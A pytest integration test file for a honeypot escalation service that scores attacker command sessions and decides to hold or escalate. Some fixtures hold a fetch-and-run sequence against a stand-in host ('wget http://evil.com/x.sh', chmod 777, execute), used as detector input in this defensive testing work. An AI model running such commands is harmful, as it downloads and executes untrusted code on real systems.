"""
tests/integration/test_escalation_api.py

Exercises the real Escalation Engine FastAPI app (POST /evaluate, GET
/health, GET /sessions/escalated) with fakeredis standing in for Redis and
a minimal stub standing in for AsyncElasticsearch — no real Docker stack
needed.

Loaded via importlib with an explicit module name because both
telemetry/main.py and escalation_engine/main.py are named "main.py";
a plain `import main` would silently reuse whichever one got cached first.
"""

import importlib.util
import sys
import types
from pathlib import Path

import fakeredis.aioredis
import pytest
from fastapi.testclient import TestClient

ESCALATION_DIR = Path(__file__).resolve().parent.parent.parent / "escalation_engine"


class FakeAsyncElasticsearch:
    """Minimal stand-in: just enough surface for main.py's usage."""

    async def index(self, index, document):
        return {"result": "created", "_index": index}

    async def search(self, index, body):
        return {"hits": {"hits": [], "total": {"value": 0}}}

    async def close(self):
        pass


def _load_escalation_main():
    # Make sibling import (`from models import ...`) resolve.
    sys.path.insert(0, str(ESCALATION_DIR))

    spec = importlib.util.spec_from_file_location("escalation_main", ESCALATION_DIR / "main.py")
    module = importlib.util.module_from_spec(spec)
    sys.modules["escalation_main"] = module
    spec.loader.exec_module(module)

    # IMPORTANT: `import redis.asyncio as aioredis` makes module.aioredis the
    # *same shared module object* as sys.modules['redis.asyncio']. Mutating
    # module.aioredis.Redis directly would patch that shared module for every
    # other test file that also imports redis.asyncio (telemetry, honeytrap).
    # Rebind the name itself instead, which only affects this module's globals.
    fake_redis_ns = types.SimpleNamespace(
        Redis=lambda *a, **kw: fakeredis.aioredis.FakeRedis(decode_responses=True)
    )
    module.aioredis = fake_redis_ns
    module.AsyncElasticsearch = lambda *a, **kw: FakeAsyncElasticsearch()
    return module


@pytest.fixture
def client():
    module = _load_escalation_main()
    with TestClient(module.app) as c:
        yield c
    sys.path.remove(str(ESCALATION_DIR))
    del sys.modules["escalation_main"]


def test_health(client):
    resp = client.get("/health")
    assert resp.status_code == 200
    body = resp.json()
    assert body["status"] == "ok"
    assert body["classifier"] == "RuleBasedClassifier"  # USE_PRETRAINED_NLP=false per conftest


def test_evaluate_benign_command_holds(client):
    resp = client.post("/evaluate", json={
        "session_id": "test-sess-1",
        "command": "echo hello",
        "sequence": ["echo hello"],
        "mitre": [],
        "honeypot": "cowrie",
    })
    assert resp.status_code == 200
    body = resp.json()
    assert body["decision"] == "HOLD"
    assert body["session_id"] == "test-sess-1"


def test_evaluate_malicious_sequence_escalates(client):
    sequence = ["whoami", "wget http://evil.com/x.sh", "chmod 777 x.sh", "./x.sh"]
    resp = client.post("/evaluate", json={
        "session_id": "test-sess-2",
        "command": "./x.sh",
        "sequence": sequence,
        "mitre": [{"technique_id": "T1105", "tactic": "Command and Control"}],
        "honeypot": "cowrie",
    })
    assert resp.status_code == 200
    body = resp.json()
    assert body["decision"] == "ESCALATE"
    assert body["risk_score"] >= 70


def test_escalated_sessions_are_retrievable(client):
    client.post("/evaluate", json={
        "session_id": "test-sess-3",
        "command": "wget http://evil.com/x.sh && chmod 777 x.sh",
        "sequence": ["wget http://evil.com/x.sh && chmod 777 x.sh"] * 5,
        "mitre": [{"technique_id": "T1105", "tactic": "Credential Access"}],
        "honeypot": "cowrie",
    })
    resp = client.get("/sessions/escalated")
    assert resp.status_code == 200
    body = resp.json()
    assert body["count"] >= 1
